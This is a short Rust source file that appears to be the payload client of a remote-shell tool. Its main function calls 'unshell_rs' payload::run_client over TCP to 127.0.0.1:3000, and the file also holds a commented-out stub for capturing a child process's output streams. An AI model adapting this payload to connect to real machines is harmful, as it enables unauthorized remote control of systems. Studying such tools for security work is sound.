// #[allow(unsafe_op_in_unsafe_fn)]
// mod execute;

use std::error::Error;
use unshell_rs::{
    networkers::{TCPClient, TCPConnection},
    payload::run_client,
};

// /// Pipe streams are blocking, we need separate threads to monitor them without blocking the primary thread.
// fn child_stream_to_vec<R>(mut stream: R) -> Arc<Mutex<Vec<u8>>>
// where
//     R: Read + Send + 'static,
// {
//     let out = Arc::new(Mutex::new(Vec::new()));
//     let vec = out.clone();

// }

fn main() -> Result<(), Box<dyn Error>> {
    run_client::<TCPConnection, TCPClient>("127.0.0.1:3000")?;

    Ok(())
}
